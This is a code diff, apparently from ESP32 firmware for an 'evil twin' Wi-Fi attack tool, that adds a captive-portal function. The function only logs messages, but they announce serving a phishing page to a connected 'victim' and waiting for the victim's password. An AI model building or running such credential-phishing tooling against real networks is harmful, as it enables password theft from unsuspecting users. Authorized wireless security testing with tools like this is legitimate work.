@@ -421,6 +421,22 @@ bool captured_data_is_verified(int index) {
     return g_captured_data[index].verified_correct;
 }
 
+// ==================== CAPTIVE PORTAL ====================
+void start_captive_portal(const uint8_t *bssid)
+{
+    ESP_LOGI(TAG, "🔓 Starting captive portal for %02X:%02X:%02X:%02X:%02X:%02X",
+             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+    
+    // The captive portal is handled by the DNS redirect task + webserver
+    // which are already started in eviltwin_task_func.
+    // This function is called when a victim connects to set up
+    // the phishing page serving.
+    
+    // Redirect victim to captive portal login page
+    ESP_LOGI(TAG, "🌐 Victim connected! Serving phishing page at http://192.168.4.1/eviltwin/portal");
+    ESP_LOGI(TAG, "🔑 Waiting for password submission...");
+}
+
 void captured_data_clear(void) {
     g_captured_count = 0;
     memset(g_captured_data, 0, sizeof(g_captured_data));
